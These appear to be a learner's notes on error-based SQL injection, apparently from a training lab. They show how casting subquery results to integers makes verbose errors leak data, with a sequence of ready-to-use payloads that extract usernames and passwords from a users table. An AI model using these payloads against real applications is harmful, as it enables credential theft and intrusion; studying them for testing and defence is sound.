
### Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages that can contain useful information.

`CAST((SELECT example_column FROM example_table) AS int)` converts data types, if it's an incompatible type (string -> int) might cause an error, which could be useful to trigger *conditional responses*.

if there is a *character limitation*, you can't use too verbose (long?) queries.

HOW TO:

* commenting helps with eliminating the closing *quotation* that already exist
  in the application's code.

test it:

`' AND CAST((SELECT 1) AS INT) --` returns an error, because it expects a boolean, 1=1 (true)

`' AND 1=CAST((SELECT 1) AS INT) --` is true, so no error returned

`' AND 1=CAST((SELECT "abc") AS INT) --` error, returning `"abc"` because 

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT) --`

remove the cookie because it's not needed and leaves us more characters.

`LIMT 1` so that it doesn't show too many rows.

AND we get an error: invalid input syntax for type integer: "administrator"

so we get the idea to : `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --`

using this stuff, you can get `version()` and all.


ERROR indicating *character limit*:

Unterminated string literal started at position 95 in SQL SELECT * FROM
tracking WHERE id = 'hyPr13PYPcOYmG05' AND CAST((SELECT password FROM users
where'. Expected  char